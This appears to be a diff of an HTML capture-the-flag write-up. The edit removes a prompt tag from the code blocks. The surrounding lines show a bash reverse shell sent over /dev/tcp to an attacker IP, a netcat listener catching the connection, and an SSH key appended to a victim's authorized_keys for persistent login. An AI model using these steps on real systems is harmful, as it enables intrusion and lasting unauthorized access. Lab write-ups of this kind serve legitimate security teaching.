@@ -324,7 +324,7 @@ bash -c 'exec bash -i &amp;&gt;/dev/tcp/<strong>${VPNIP}</strong>/1234 &lt;&amp;
 <li>Let's start a&nbsp;<strong>nc</strong> listener on port&nbsp;<strong>1234</strong> to prepare to receive our reverse shell! (from attack machine)
 <ul>
 <li>
-<pre>$ nc -vlnp 1234                                                                                                                                                      &lt;aws:bowtie_agency&gt;
+<pre>$ nc -vlnp 1234                                                                                                                                                      
 Listening on 0.0.0.0 1234</pre>
 </li>
 </ul>
@@ -342,7 +342,7 @@ Listening on 0.0.0.0 1234</pre>
 </ul>
 </li>
 <li>
-<pre>$ nc -vlnp 1234                                                                                                                                                      &lt;aws:bowtie_agency&gt;
+<pre>$ nc -vlnp 1234                                                                                                                                                      
 Listening on 0.0.0.0 1234
 Connection received on ${VMIP} 41036
 bash: cannot set terminal process group (1410): Inappropriate ioctl for device
@@ -369,7 +369,7 @@ echo "ssh-rsa my-ssh-public-key ..." &gt;&gt; .ssh/authorized_keys</pre>
 </li>
 <li>Let's try to SSH as&nbsp;<strong>fred</strong> now using our SSH public key authorized under his server account</li>
 <li>
-<pre>$ ssh fred@<strong>${VMIP}</strong>                                                                                                                                              &lt;aws:bowtie_agency&gt;
+<pre>$ ssh fred@<strong>${VMIP}</strong>                                                                                                                                             
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
